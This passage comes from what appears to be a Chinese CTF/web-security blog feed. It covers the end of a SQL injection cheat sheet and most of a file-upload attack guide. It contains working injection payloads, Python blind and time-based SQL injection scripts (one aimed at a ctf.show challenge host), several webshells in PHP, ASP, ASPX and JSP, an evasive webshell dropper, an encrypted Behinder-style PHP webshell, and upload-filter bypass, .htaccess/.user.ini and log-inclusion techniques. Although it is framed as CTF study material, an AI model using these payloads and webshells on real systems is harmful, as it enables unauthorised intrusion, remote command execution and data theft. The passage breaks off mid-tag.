table_schema=database()))#&amp;password=123</span><br><span class="line"># 查列：</span><br><span class="line">username=123&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;))#&amp;password=123</span><br><span class="line"># 查数据：</span><br><span class="line">username=123&#x27;,(select group_concat(flag) from flag))#&amp;password=123</span><br></pre></td></tr></table></figure><h2 id="无列名注入"><a class="header-anchor" href="#无列名注入">¶</a>无列名注入</h2><p>又名无列注入, 其实就是柱子替代列名</p><p>参考文章:</p><ul><li><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入</a></li><li><a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schema与无列名注入</a></li></ul><h2 id="Delete注入"><a class="header-anchor" href="#Delete注入">¶</a>Delete注入</h2><p>delete不能用union和select, 可以用报错注入或者是盲注</p><p>如果回显没有被覆盖, 那就用报错注入</p><h2 id="into-outfile"><a class="header-anchor" href="#into-outfile">¶</a>into outfile</h2><p>这个真没名字吧</p><p>参考文章:</p><ul><li><a href="https://dev.mysql.com/doc/refman/8.4/en/select-into.html">SELECT … INTO Statement</a></li><li><a href="https://blog.csdn.net/weixin_50002038/article/details/131349038">数据备份(导出数据 / 导入数据)</a></li><li><a href="https://www.cnblogs.com/zjhzjhhh/p/14129167.html" title="发布于 2020-12-13 17:06">sql注入之文件写入into outfile</a></li></ul><h2 id="UDF注入"><a class="header-anchor" href="#UDF注入">¶</a>UDF注入</h2><p>参考文章:</p><ul><li><a href="https://www.freebuf.com/articles/web/283566.html">UDF提权命令执行</a></li><li><a href="https://www.sqlsec.com/tools/udf.html">sqlmap udf文件的16进制</a></li></ul><p>这个也用于渗透中的提权操作</p><h2 id="Quine注入"><a class="header-anchor" href="#Quine注入">¶</a>Quine注入</h2><h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3><p>Quine指的是自产生程序, 简单的说, 就是输入的sql语句与要输出的一致</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 特征:</span></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>但是一般出现这种代码, 表都是空的, 可能会有后台phpmyadmin弱密码登录, 登录后通常会发现是空的</p><p>只有构造输入输出完全一致的语句, 才能绕过限制得到FLAG, 主要利用replace(str,old_string,new_string)进行构造, 构造思路如下:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure><p>输入和输出的结果为下 :</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line">replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,<span class="type">char</span>(<span class="number">46</span>),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) ;</span><br></pre></td></tr></table></figure><p>但是依然还有单引号和双引号不一致, 再套一层, 最后结果如下, 实现了输入输出一致</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="附加条件处理"><a class="header-anchor" href="#附加条件处理">¶</a>附加条件处理</h3><ul><li>过滤了char, 用chr或者直接0x代替即可</li><li>函数使用限制, 用大小写绕过</li></ul><h2 id="nosql"><a class="header-anchor" href="#nosql">¶</a>nosql</h2><p>就是其他数据库的注入/查询方法</p><ol><li>MongoDB重言式</li></ol><p>在mongodb中，要求的查询语句是json格式，如<code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;</code></p><p>而在php中，json就是数组，也就是<code>Array('username'=&gt; 'admin', 'password'=&gt; 'admin')</code>，</p><p>同时MongoDB要求的json格式中，是可以进行条件查询的，如这样的json: <code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &#123;&quot;$regex&quot;: '^abc$'&#125;&#125;</code>，会匹配密码abc</p><p>也就是说，如果键对应的值是一个字符串，那么就相当于条件等于，只不过省去了json，如果键对应的值是json对象，就代表是条件查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><blockquote><p><code>$ne</code>是不相等的意思, <code>$regex</code>则是正则匹配</p></blockquote><p>也可以利用盲注, 只是payload构造不同罢了</p><h1>脚本编写</h1><p>利用<code>regexp()</code>函数:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 假设 user 表有以下记录：</span><br><span class="line">| id | pass     |  </span><br><span class="line">|  1 | password |  </span><br><span class="line">|  2 | ctf123   |  </span><br><span class="line">|  3 | secret   |  </span><br><span class="line">|  4 | ctf_flag |  </span><br><span class="line"></span><br><span class="line"># 执行查询 select * from user where pass regexp(&quot;ctf&quot;) 将返回：</span><br><span class="line">| id | pass   |  </span><br><span class="line">|  2 | ctf123 |  </span><br><span class="line">|  4 | ctf_flag |  </span><br></pre></td></tr></table></figure><p>示例代码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_lowercase</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;admin\&#x27; and (select database()) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;-&#125;_&#x27;</span> + digits + ascii_lowercase:</span><br><span class="line">    resp = post(url, &#123;<span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(flag + c)&#125;)</span><br></pre></td></tr></table></figure><p>或者是直接遍历字符, 用函数给他编个码, 示例代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">res = requests.post(url=url, data=data)</span><br></pre></td></tr></table></figure><h1>附录</h1><p>这是一个能应对大多数题目的盲注脚本, 有时候不好用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">res_judge</span>(<span class="params">url, payload</span>):</span><br><span class="line">    <span class="comment"># 发送请求并判断响应时间是否足够长, 以确认匹配</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url=url, data=data, timeout=<span class="number">0.7</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">the_length</span>(<span class="params">url, query</span>):</span><br><span class="line">    <span class="comment"># 确定查询结果的长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;\&#x27;or if((length((<span class="subst">&#123;query&#125;</span>)))=<span class="subst">&#123;i&#125;</span>,sleep(2),1)#&quot;</span></span><br><span class="line">        <span class="comment"># if((length((&#123;query&#125;)))=&#123;length&#125;,sleep(2),1)&amp;debug=1</span></span><br><span class="line">        <span class="keyword">if</span> res_judge(url, payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found the length: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">url = <span class="string">&quot;http://a24c3f93-a30a-47eb-abb2-6a4983c4468b.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;,_&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># query = &quot;select database()&quot;</span></span><br><span class="line"><span class="comment"># query = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;</span></span><br><span class="line"><span class="comment"># query = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">query = <span class="string">&quot;select flagaa from ctfshow_flagxc&quot;</span></span><br><span class="line"></span><br><span class="line">length = the_length(url, query)</span><br><span class="line"><span class="keyword">if</span> length:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line"></span><br><span class="line">            payload = <span class="string">f&quot;\&#x27;or if((substr((<span class="subst">&#123;query&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;mid&#125;</span>&#x27;),sleep(2),1)#&quot;</span></span><br><span class="line">            <span class="keyword">if</span> res_judge(url, payload):</span><br><span class="line">                flag += mid</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;i&#125;</span>th character: <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] The String: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] Error occurred: length return none&quot;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/article/file-upload/"/>
      <url>/article/file-upload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>文件上传</h1><hr><h2 id="木马"><a class="header-anchor" href="#木马">¶</a>木马</h2><h3 id="一句话木马"><a class="header-anchor" href="#一句话木马">¶</a>一句话木马</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php一句话</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// js一句话</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;2333&quot;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 短标签</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 无分号</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">array_pop</span>(<span class="variable">$_POST</span>))<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关键词绕过:php</span></span><br><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;absbsbebrbt&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// asp一句话</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">requset</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// aspx一句话</span></span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><h3 id="进阶类木马"><a class="header-anchor" href="#进阶类木马">¶</a>进阶类木马</h3><p>jsp木马, 密码为shell</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;shell&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))) &#123;</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            out.print(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>免杀马, 被包含或者执行之后生成<code>1.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;  </span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>更高级一点的木马:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件解析漏洞"><a class="header-anchor" href="#文件解析漏洞">¶</a>文件解析漏洞</h2><h3 id="Apache"><a class="header-anchor" href="#Apache">¶</a>Apache</h3><p>从右向左解析,直到遇到可解析的后缀( 特性 )只有当配置文件存在<code>AddHandler application/x-httpd-php .php</code>,才会有解析漏洞</p><h3 id="Nginx"><a class="header-anchor" href="#Nginx">¶</a>Nginx</h3><p>低版本可以在任意文件名后添加%00.php进行攻击</p><p>高版本和<code>IIS 7.5</code>一样,但是需要开启<strong>允许解析其他格式文件为PHP</strong>,否则会报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/php5/fpm/pool.d/www.conf 的 security.limit_extensions</span><br></pre></td></tr></table></figure><h3 id="Tomcat"><a class="header-anchor" href="#Tomcat">¶</a>Tomcat</h3><p>远程代码执行 CVE-2017-12615</p><p>在配置文件web.xml中,servlet配置<code>readonly=false</code>会引发任意文件上传漏洞</p><h3 id="IIS"><a class="header-anchor" href="#IIS">¶</a>IIS</h3><p>可处理<code>.asp</code>,<code>.cer</code>,<code>.asa</code></p><p><code>IIS 6.0</code>在处理含有特殊符号的文件路径会出现逻辑错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/test.asp/test.jpg</span><br><span class="line">// 新建test.asp目录,这个目录任何文件都被当作asp程序执行</span><br><span class="line">test.asp;.jpg</span><br><span class="line">// 被 ; 影响,依然会被当作asp执行</span><br></pre></td></tr></table></figure><p><code>IIS 7.5</code></p><p>url后缀中带有 .php 就交给 php 处理,修饰之后去掉 /.php,如果修饰后此文件存在,将该文件作为php程序执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.jpg/.php</span><br></pre></td></tr></table></figure><h2 id="绕过"><a class="header-anchor" href="#绕过">¶</a>绕过</h2><h3 id="常见后缀黑白名单"><a class="header-anchor" href="#常见后缀黑白名单">¶</a>常见后缀黑白名单</h3><p>函数pathinfo()获取文件后缀</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Blacklist：</span><br><span class="line">php/ php2/ php3/ php4/ php5/ pht/ asp/ aspx/ ascx/ jsp/ bat/ exe/ dll</span><br><span class="line"></span><br><span class="line">Whitelist:</span><br><span class="line">jpg/ png/ gif/ doc/ docx/ xls</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">phtml/</span><br></pre></td></tr></table></figure><h3 id="前端检验绕过"><a class="header-anchor" href="#前端检验绕过">¶</a>前端检验绕过</h3><ul><li>删除浏览器事件</li></ul><p>过滤原理: 调用<code>selectFile()</code>将文件名转换为小写,通过<code>substr()</code>获取文件名后缀(包括点)进行判断</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return selectFile()&quot;</span>&gt;</span></span><br><span class="line">// 删掉return selectFile()</span><br></pre></td></tr></table></figure><ul><li>bp抓包修改后缀</li></ul><p>仅仅在前端检测了文件后缀, 后缀并没有检测包</p><ul><li><p>构造上传表单</p></li><li><p>禁用js等</p></li></ul><h3 id="后端检验绕过"><a class="header-anchor" href="#后端检验绕过">¶</a>后端检验绕过</h3><blockquote><p>原理后缀名检测MIME类型检测文件内容检测00截断检测条件竞争检测</p></blockquote><h4 id="后缀名黑名单"><a class="header-anchor" href="#后缀名黑名单">¶</a>后缀名黑名单</h4><ul><li>大小写绕过: php -&gt; pHp</li><li>换后缀: 有些中间件可以解析其他后缀,asa,cer; 或者在httpd.conf配置文件添加配置</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php</span><br><span class="line">AddType application/x-httpd-php .php3</span><br><span class="line">AddType application/x-httpd-php .phtml</span><br></pre></td></tr></table></figure><ul><li>Windows特性: windows会自己修改不被允许的文件,所以部分情况一样可以解析为php:</li></ul><table><thead><tr><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>末尾加点</td><td><code>1.php.</code></td></tr><tr><td>末尾加空格</td><td><code>1.php </code></td></tr><tr><td>加<code>::$DATA</code></td><td><code>1.php::$DATA</code></td></tr></tbody></table><h4 id="后缀名白名单"><a class="header-anchor" href="#后缀名白名单">¶</a>后缀名白名单</h4><blockquote><p>常常配合文件包含或解析漏洞</p></blockquote><ul><li>MIME修改</li><li>%00,0x00截断</li></ul><h3 id="MIME类型绕过"><a class="header-anchor" href="#MIME类型绕过">¶</a>MIME类型绕过</h3><p>后端获取特征:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] != <span class="string">&quot;image/jpeg&quot;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>文件扩展名</th><th>Mime-Type</th></tr></thead><tbody><tr><td>.js</td><td>application/x-javascript</td></tr><tr><td>.html</td><td>text/html</td></tr><tr><td>.jpg</td><td>image/jpeg</td></tr><tr><td>.png</td><td>image/png</td></tr><tr><td>.pdf</td><td>application/pdf</td></tr></tbody></table><p>抓包, 在<code>Content-Type</code>处修改MIME即可, 一般都会有</p><h3 id="文件幻数检测"><a class="header-anchor" href="#文件幻数检测">¶</a>文件幻数检测</h3><blockquote><p>原理:getimagesize()获取图片宽高等信息,如果不是图片则没有信息; 即检测文件幻数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件幻数:</span><br><span class="line">JPG:FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">GIF:47 49 46 38 39 61// GIF89a</span><br><span class="line">PNG:    89 50 4E 47</span><br><span class="line">JPEG：   FF D8 FF</span><br><span class="line">PNG：    89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">PDF：    25 50 44 46 2D   // 表示%PDF-</span><br><span class="line">ZIP：    50 4B 03 04</span><br><span class="line">Windows可执行文件：4D 5A   // 表示MZ</span><br><span class="line">TIFF：49 49 2A 00 或 4D 4D 00 2A</span><br></pre></td></tr></table></figure><p>Winhex在文件头部补充即可, 又叫做文件头检测</p><h3 id="文件内容检测"><a class="header-anchor" href="#文件内容检测">¶</a>文件内容检测</h3><p>检查不能有特定符号和字符串, 比如php, 括号等</p><p>通常利用配置文件加上短标签绕过, 这里给出一些例子:</p><table><thead><tr><th>检测</th><th>绕过</th></tr></thead><tbody><tr><td>php</td><td>配置文件/短标签</td></tr><tr><td>中括号</td><td>大括号</td></tr><tr><td>分号</td><td>更换木马/直接执行命令</td></tr></tbody></table><p>直接执行命令例子如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&quot;tac /var/www/html/flag.php&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&quot;tac ../flag.php&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他方法"><a class="header-anchor" href="#其他方法">¶</a>其他方法</h2><h3 id="00截断"><a class="header-anchor" href="#00截断">¶</a>00截断</h3><blockquote><p>原理: 即chr(0),程序把它当成了结束符号</p></blockquote><p>php版本小于5.3.4magic_quotes_gpc为OFF</p><h3 id="phar文件上传"><a class="header-anchor" href="#phar文件上传">¶</a>phar文件上传</h3><h3 id="配置文件上传"><a class="header-anchor" href="#配置文件上传">¶</a>配置文件上传</h3><ul><li><code>.htaccess</code></li></ul><p>条件: httpd.conf 中 <code>AllowOverride</code> 参数为 All, 即允许.htaccess文件覆盖掉 Apache 的配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php .jpg</span><br><span class="line">// 将内容符合php语法规则的文件当作php文件解析, shell.jpg 会被执行</span><br><span class="line"></span><br><span class="line">AddHandler php5-script .php</span><br><span class="line">// 匹配文件名中的关键字, shell.php.png会被执行</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">// 匹配文件名字</span><br></pre></td></tr></table></figure><ul><li><code>.user.ini</code></li></ul><p>条件: 当前目录下有php文件才会启用用户INI文件</p><p>常见的利用方法是利用可访问的文件去包含新上传的木马, 可用配置项目如下:</p><ul><li>auto_append_file</li><li>auto_prepend_file</li></ul><p>区别在于<code>auto_prepend_file</code>是在文件前插入；<code>auto_append_file</code>在文件最后插入（文件末尾有<code>exit()</code>时该设置无效)</p><p>下面是一个例子, 传入之后再次上传shell.jpg会被自动包含</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="文件包含"><a class="header-anchor" href="#文件包含">¶</a>文件包含</h3><ul><li>日志包含</li></ul><p>利用配置文件上传使得日志被包含, 然后就是构造UA头再次访问, 直接getshell</p><p>可以用的木马:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span> <span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者直接在配置文件里面写: <code>.user.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=/var/log/nginx/access.log</span><br><span class="line"><span class="comment"># 下面这个有时候可以用在其他地方</span></span><br><span class="line"><span 